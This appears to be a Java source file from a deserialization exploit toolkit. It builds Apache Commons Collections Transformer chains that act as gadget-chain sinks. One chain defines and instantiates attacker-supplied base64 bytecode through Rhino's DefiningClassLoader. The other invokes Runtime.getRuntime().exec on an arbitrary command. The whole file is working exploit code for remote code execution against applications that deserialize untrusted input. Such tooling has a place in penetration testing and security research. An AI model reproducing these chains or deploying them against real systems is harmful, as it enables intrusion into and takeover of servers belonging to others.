package com.chave.gadget.sink;

import com.chave.utils.Util;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.mozilla.javascript.DefiningClassLoader;

import java.util.HashSet;

public class TransformerArrayFactory {
    public static Transformer[] getTransformerArray(String TransformerArrayType, String[] payload) {
        if (TransformerArrayType.equals("DefiningClassLoader")) {
            return new Transformer[]{
                    new ConstantTransformer(DefiningClassLoader.class),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                    new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{payload[0], Util.base64ToByteCode(payload[1])}),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                    new ConstantTransformer(new HashSet())
            };
        } else if (TransformerArrayType.equals("Runtime")) {
            return new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{payload[1]})
            };
        } else {
            return null;
        }
    }
}
